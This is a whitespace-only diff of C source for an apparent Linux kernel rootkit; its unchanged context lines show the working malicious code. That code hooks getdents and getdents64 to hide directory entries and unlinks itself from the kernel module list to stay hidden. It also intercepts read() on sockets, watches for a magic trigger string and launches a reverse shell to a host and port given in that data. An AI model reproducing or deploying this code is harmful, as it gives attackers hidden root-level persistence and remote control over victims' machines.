@@ -105,6 +105,7 @@ asmlinkage int intercepted_getdents(unsigned int fd, struct linux_dirent __user 
     ret = orig_getdents(fd, dirp, count);
     if (ret <= 0)
         return ret;
+
     kdir = kmalloc(ret, GFP_KERNEL);
     if (kdir == NULL)
         return ret;
@@ -112,8 +113,10 @@ asmlinkage int intercepted_getdents(unsigned int fd, struct linux_dirent __user 
         kfree(kdir);
         return ret;
     }
+    
     in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
     proc = in->i_ino == PROC_ROOT_INO && !MAJOR(in->i_rdev);
+
     previous_dir = NULL;
     current_dir = kdir;
     for (int bpos = 0; bpos < ret; current_dir = (void*) kdir + bpos) {
@@ -131,6 +134,7 @@ asmlinkage int intercepted_getdents(unsigned int fd, struct linux_dirent __user 
         bpos += current_dir->d_reclen;
     }
     copy_to_user(dirp, kdir, ret);
+
     kfree(kdir);
     return ret;
 }
@@ -145,7 +149,7 @@ asmlinkage int intercepted_getdents64(unsigned int fd, struct linux_dirent64 __u
     ret = orig_getdents64(fd, dirp, count);
     if (ret <= 0)
         return ret;
-    
+
     kdir = kmalloc(ret, GFP_KERNEL);
     if (kdir == NULL)
         return ret;
@@ -153,8 +157,10 @@ asmlinkage int intercepted_getdents64(unsigned int fd, struct linux_dirent64 __u
         kfree(kdir);
         return ret;
     }
+
     in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
     proc = in->i_ino == PROC_ROOT_INO && !MAJOR(in->i_rdev);
+
     previous_dir = NULL;
     current_dir = kdir;
     for (int bpos = 0; bpos < ret; current_dir = (void*) kdir + bpos) {
@@ -172,6 +178,7 @@ asmlinkage int intercepted_getdents64(unsigned int fd, struct linux_dirent64 __u
         bpos += current_dir->d_reclen;
     }
     copy_to_user(dirp, kdir, ret);
+    
     kfree(kdir);
     return ret;
 }
@@ -180,10 +187,13 @@ void hide_module(void)
 {
     if (module_hidden)
         return;
+
     prev_mod = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
+
     kfree(THIS_MODULE->sect_attrs);
     THIS_MODULE->sect_attrs = NULL;
+
     module_hidden = true;
 }
 
@@ -191,7 +201,9 @@ void unhide_module(void)
 {
     if (!module_hidden)
         return;
+
     list_add(&THIS_MODULE->list, prev_mod);
+
     module_hidden = false;
 }
 
@@ -223,6 +235,7 @@ void invoke_rev_shell(char *host, char *port)
 {
     char *argv[] = { "/" MAGIC_PREFIX "-util/rev", host, port, NULL };
     char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
@@ -237,6 +250,7 @@ asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
     in = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
     if (ret <= 0 || ret < strlen(BACKDOOR_MAGIC) || !S_ISSOCK(in->i_mode))
         return ret;
+
     backdoor = NULL;
     for (int i = 0; i < ret - strlen(BACKDOOR_MAGIC); i++) {
         if (memcmp(buf + i, BACKDOOR_MAGIC, strlen(BACKDOOR_MAGIC)) == 0) {
@@ -246,6 +260,7 @@ asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
     }
     if (backdoor == NULL)
         return ret;
+
     kbuf = kmalloc(ret, GFP_KERNEL);
     if (kbuf == NULL)
         return ret;
@@ -253,7 +268,9 @@ asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
         kfree(kbuf);
         return ret;
     }
+
     backdoor = kbuf + ((void*) backdoor - buf) + strlen(BACKDOOR_MAGIC) + 1; 
+
     host = backdoor;
     port = NULL;
     for (int i = 0; i < 1024; i++) {
@@ -265,7 +282,9 @@ asmlinkage ssize_t intercepted_read(int fd, void __user *buf, size_t count)
             break;
         }
     }
+
     invoke_rev_shell(host, port);
+    
     kfree(kbuf);
     return ret;
 }
